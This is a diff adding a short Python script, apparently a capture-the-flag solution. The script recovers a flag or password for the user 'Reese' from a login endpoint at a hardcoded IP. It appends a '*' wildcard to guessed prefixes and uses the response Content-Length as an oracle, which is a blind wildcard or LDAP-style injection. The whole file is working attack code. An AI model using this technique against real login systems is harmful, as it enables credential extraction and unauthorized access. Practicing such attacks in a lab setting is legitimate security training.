@@ -1,0 +1,17 @@
+import requests
+import string
+flag = ''
+wl = ''
+wordlist = string.ascii_lowercase + string.ascii_uppercase + '0123456789_}'
+while 1:
+    for i in wordlist:
+        wl = flag+i
+        url = 'http://178.128.37.153:32155/login'
+        value = {'username':'Reese','password':wl+'*'}
+        response = requests.post(url,value)
+        if response.headers['Content-Length'] == '2586':
+            flag = wl
+            print(flag)
+            break
+    if i=='}':
+        break
